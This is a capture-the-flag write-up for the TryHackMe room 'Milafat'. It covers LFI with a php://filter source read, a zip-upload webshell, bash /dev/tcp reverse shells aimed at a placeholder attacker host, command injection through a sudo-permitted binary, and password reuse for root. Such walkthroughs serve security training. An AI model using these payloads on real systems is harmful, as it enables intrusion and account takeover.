# Milafat Write-up - TryHackMe
**Author:** Zakaria El Kouissi  
**LinkedIn:** https://www.linkedin.com/in/<your-profile>

## Introduction
This is the official write-up for my TryHackMe room **Milafat**.
Difficulty: **Beginner / Intermediate**
Topics covered:
- Enumeration
- Exploitation
- Privilege escalation

---

## Objectives
- [ ] User flag
- [ ] Root flag

---

## 1. Enumeration

### Nmap Scan
In the enumeration phase, I always start with two nmap scans, the first one scans for all open ports, and the second one is an aggressive scan of all open ports found in the first scan
The first nmap scan:
```bash
sudo nmap -p- -T4 <TARGET_IP> -oN nmap/open-ports.txt -v
```
<img width="1035" height="643" alt="image" src="https://github.com/user-attachments/assets/16ff27a3-b298-4cbb-afba-04231bb0b81f" />

We see that the machine has 4 open ports:
- ftp at 21
- ssh at 22
- http at 80
- something at port 55580

Now we will run a second scan, which will be aggressive to gather more information about the open ports, and especially to know which service runs at port 55580.
The second nmap scan:
```bash
sudo nmap -p21,22,80,55580 -A 10.10.249.229 -oN nmap/aggressive-scan.txt
```
<img width="1897" height="621" alt="image" src="https://github.com/user-attachments/assets/9355267b-b464-4662-8b71-68e949e4f19b" />

This second scan gave us a lot of information:
- Port 80 runs a WordPress webpage
- Port 55580 also runs an HTTP service

### Checking FTP for anonymous login
Before diving into web enumeration, let's enumerate the ftp service.

<img width="834" height="268" alt="image" src="https://github.com/user-attachments/assets/0d72e0b8-c79f-4dd4-b038-b87cbae4f140" />

We can see that the ftp service allows anonymous login, and it contains a file named "passwords.bak". It looks interesting, let's download it to our machine and open it.

<img width="552" height="74" alt="image" src="https://github.com/user-attachments/assets/e826a4b9-21cd-49c9-945d-929ec63420d9" />

The file contains some credentials. I tried using them in ftp, SSH, and also WordPress, but I didn't get anything.

### Checking the webpage at port 55580
Since running a webpage at port 55580 is unusual, let's start enumerating first.

<img width="1919" height="889" alt="image" src="https://github.com/user-attachments/assets/8f3d1044-63e8-4b08-b262-44ad2df05a45" />

"Website under construction." This seems interesting.
Let's fuzz its content for some interesting files and directories.

#### Website fuzzing
For the website fuzzing, I also ran two scans. The first with a file wordlist, and the second with a directory wordlist.
```bash
ffuf -u "http://<TARGET_IP>:55580/FUZZ" -w <wordlist> -c
```
<img width="1327" height="752" alt="image" src="https://github.com/user-attachments/assets/f064e0a1-7190-4a92-bcf2-6e2cc62f2a29" />

We can see that the website has a file upload webpage and other PHP webpages that we should check.

<img width="1919" height="881" alt="image" src="https://github.com/user-attachments/assets/28cabc8b-66fb-4d44-8031-917bd1f3da7d" />

The about.php page contains a list tag that contains a list of languages. If we choose one, a PHP parameter "lang" is added to the URL with the name of a file as an argument.
If we changed the argument of the "lang" parameter to a random string, the text disappears.

## 2. Exploitation
#### Exploiting LFI vulnerability
**Why not read a system file instead of "en.php"?**
Let's try a path traversal technique to read /etc/passwd file.
```url
http://<TARGET_IP>:55580/about.php?lang=../../../../../../../etc/passwd
```
<img width="1918" height="885" alt="image" src="https://github.com/user-attachments/assets/015b792f-03e1-40eb-be7d-b0a07cd2cc42" />

We didn't get the content of /etc/passwd file, instead we got a message saying "The file you requested cannot be proccessed". So maybe ".." is filtered. Let's use the absolute path of /etc/passwd instead.
```url
http://<TARGET_IP>:55580/about.php?lang=/etc/passwd
```
It worked, we got the content of /etc/passwd.

<img width="1919" height="887" alt="image" src="https://github.com/user-attachments/assets/31ee8308-f439-470d-b52a-149862c59d21" />

The information we can get from this is the usernames that exist in the system. In this machine, there are three usernames (zakaria, anas, and ubuntu).
The first thing we can do is check whether there are any SSH private keys we can read for those users, using the same technique we used to read the/etc/passwd file: exploiting the LFI vulnerability.
```url
http://<TARGET_IP>:55580/about.php?lang=/home/<username>/.ssh/id_rsa
```
I tried reading the SSH private key for all three users, but I got nothing.

#### Exploiting File Upload Vulnerability
We saw earlier that there is an upload webpage. Let's check it.

<img width="1919" height="885" alt="image" src="https://github.com/user-attachments/assets/8f58e624-8ec1-4e8b-99b6-c5e6ed2d2825" />

We have an HTML form, where we can upload some documents. I tried to upload a PHP webshell, but it didn't work. I get an error message. I spent some time trying to upload a PHP webshell, but I couldn't. The website is using strong server-side filtering. The error message I get is from upload.php page.

<img width="1919" height="884" alt="image" src="https://github.com/user-attachments/assets/9b3f6fb4-b1f3-4540-afd0-151c41623cb6" />

Since the website is vulnerable to LFI **why not take advantage of this vulnerability to read the source code of upload.php to try to exploit it from a white-box perspective?**
Since it's a PHP file, we couldn't just read it like we did with the /etc/passwd file. We will use a PHP wrapper to convert upload.php to a base64 string and then read it. This way, the file will not be interpreted by the PHP engine.
```url
http://<TARGET_IP>:55580/about.php?lang=php://filter/read=convert.base64-encode/resource=upload.php
```
<img width="1919" height="874" alt="image" src="https://github.com/user-attachments/assets/ce9aa49b-d135-49aa-a890-736259801d49" />

Now that we have the source code of upload.php base64 encoded. We will decode it and save it in our machine.
```bash
echo "<base64-string>" | base64 -d | tee upload.php
```
Let's open upload.php with a code editor.

<img width="1030" height="903" alt="image" src="https://github.com/user-attachments/assets/c2fab77e-f7cd-4803-8b42-bd626c125e1f" />

We can see that the upload form only allow pdf, docx, xlsx, and zip files to be uploaded.
For the uploaded zip files, the files inside them are getting extracted and saved in a directory with a specific name.
```php
$stored_file_name=bin2hex((date('H')*3600+date('i')*60).$file_name).'.'.$extension;
```
The directory name is made using the time when the file got uploaded, and the filename to create the new folder.
- date('H') * 3600 --> number of seconds due to hours
- date('i') * 60   --> number of seconds due to minute
1) It calculates a number based on the current time:
So for example at **14:30**, the calculation is:
```text
14*3600 + 30*60 = 52200
```
2) It concatenates this number with the original filename
Example filename: **document.zip**
Concatenation result: 
```text
52200document.zip
```
3) It converts this entire string into hexadecimal
bin2hex() will hex-encode the entire string:
```text
52200document.zip -> 3532323030646f63756d656e742e7a6970
```

Now that we know where the content of the uploaded zip file got extracted. Let's create a webshell and compress it to a zip file, and then upload it.
```bash
echo "<?php system(\$_REQUEST['cmd']);?>" > shell.php
zip document.zip shell.php
```
<img width="1919" height="885" alt="image" src="https://github.com/user-attachments/assets/5ca9d1e5-b14a-42cb-ba52-b73484eeae69" />

I have uploaded the zip file at 17:48, I need to convert it to UTC which is 16:48.
So the directory where the webshell.php is stored is "59760webshell.zip" in hex, which is 3630343830646f63756d656e742e7a6970.
This directory and other files when uploaded are stored inside **milafat** directory.
So now to execute the webshell we should access this path:
```url
http://<TARGET_IP>:55580/about.php?lang=milafat/3630343830646f63756d656e742e7a6970/shell.php&cmd=id
```
<img width="1919" height="883" alt="image" src="https://github.com/user-attachments/assets/02f2d55b-6bee-41cf-b9a8-c89537d634c7" />

And now we have a webshell. We can use this webshell to get a reverse shell. First we need to set up a listener in our machine at port 4444 using netcat.
```bash
nc -lnvp 4444
```
And the command that we will execute in the webshell is:
```bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/PORT 0>&1"
```
Before adding it to the url, you should first url encode it.

<img width="761" height="816" alt="image" src="https://github.com/user-attachments/assets/c277663b-1a63-42ea-a9a4-736acd24f642" />

And now we have a reverse shell to the machine as www-data user.

## 3.Privilege Escalation
### www-data user -> anas user
The first we gonna do is hunting for credentials. Since there is a wordpress website running we can check its configuration page since, it always contain database credentials.

<img width="789" height="789" alt="image" src="https://github.com/user-attachments/assets/5ade977b-69ac-421b-ba70-93a14342394f" />

We find the database credentials. Let's try using this password with the usernames available in the machine.
It turns out that this password is for the user **anas**.
Instead of continuing in the reverse shell. Let's use ssh.

<img width="768" height="825" alt="image" src="https://github.com/user-attachments/assets/f326e19f-c417-4b6c-ae95-3cd33837cda5" />

We can now read the first flag **user.txt**

<img width="610" height="234" alt="image" src="https://github.com/user-attachments/assets/9cba55d3-8b39-4136-845d-4ffc248aaeb6" />

### anas user -> zakaria user
By executing *sudo -l*, we can see that the user anas can run a binary as the user zakaria without the need for his password.

<img width="1204" height="101" alt="image" src="https://github.com/user-attachments/assets/6f83f034-e610-4639-8954-c8316bbeb046" />

The binary provides some functionalities. One of these functionalities is locating a file in the system, by choosing this functionality, we need to input the filename we want to search for.

<img width="605" height="293" alt="image" src="https://github.com/user-attachments/assets/1b856e97-c4c5-4a98-a203-7a98db730d07" />

I sent this binary to my machine to analyze it.
I read the strings of the file, and I found out that this binary executes system commands based on the option you choose. For example, to locate a file in the system, it uses the *find* command.

<img width="831" height="829" alt="image" src="https://github.com/user-attachments/assets/ede5b047-5e45-46ad-8102-8fc135180463" />

So instead of entering the name of the file we want to search for as a normal user, we can add a malicious command that will help us in our privilege escalation process.
I tried entering *passwd; id* as input. And I got both commands executed as the user zakaria.

<img width="773" height="288" alt="image" src="https://github.com/user-attachments/assets/1e8e1aba-14a2-4bf0-bf24-9a5cc481078e" />
<img width="1096" height="811" alt="image" src="https://github.com/user-attachments/assets/a2466572-c43d-460b-b806-94b6ee3ea3f9" />

So now I will try to run a reverse shell as the user zakaria. To do so, I will enter 
```bash
passwd 2>/dev/null; bash -c "bash -i >& /dev/tcp/<TARGET_IP>/<PORT> 0>&1"
```
<img width="931" height="213" alt="image" src="https://github.com/user-attachments/assets/130d6ece-7069-4c59-94a0-01b07ed843ba" />

Now I have a shell with the user zakaria.

### zakaria user -> root user
In the home directory, the .bash_history file is not empty. By reading it, we can notice something like a password. Maybe he tried to change its password, but he forgot how to use the command properly, so he tried to enter it like that.

<img width="877" height="770" alt="image" src="https://github.com/user-attachments/assets/1f412e84-54c1-4e51-93f6-0805f8cf1591" />

The password is indeed the password of the user zakaria. We can ssh to this user now using its password.

If you tried the same password to switch to root, it will work. The user zakaria and the root have the same password.

<img width="522" height="192" alt="image" src="https://github.com/user-attachments/assets/71927a99-0bbf-498e-846a-fecba2013d8b" />

Now I am authenticated as root user, and I can read root flag "root.txt".

### Congratulation you have just completed The Milafat room. I hope you enjoyed it.

## Conclusion

This room teaches:
- LFI to source-code disclosure
- Secure file upload bypass using ZIP extraction
- Reverse shells via webshells
- WordPress credential extraction
- Linux privilege escalation (sudo misconfiguration, command injection, password reuse)

Thanks for trying Milafat!
